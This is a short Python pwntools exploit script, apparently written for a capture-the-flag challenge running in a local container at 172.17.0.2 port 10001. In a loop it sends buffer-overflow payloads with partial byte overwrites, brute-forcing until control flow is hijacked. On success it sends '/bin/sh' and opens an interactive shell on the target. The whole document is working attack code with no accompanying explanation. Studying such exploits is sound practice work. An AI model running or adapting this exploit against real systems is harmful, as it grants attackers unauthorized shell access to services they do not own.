#!/usr/bin/python
#coding:utf-8
from pwn import *
context.update(arch = 'amd64', os = 'linux')
i = 0

while True:
	i+=1
	print i
	io = remote("172.17.0.2", 10001)
	io.recv()
	payload='a'*40+'\xca'
	io.sendline(payload)
	payload='b'*200
	payload+='\x01\xa9'
	io.sendline(payload)
	io.recv()
	try:
		io.recv(timeout=1)
	except:
		io.close()
		continue
	else:
		sleep(0.1)
		io.sendline('/bin/sh\x00')
		sleep(0.1)
		io.interactive()
		break
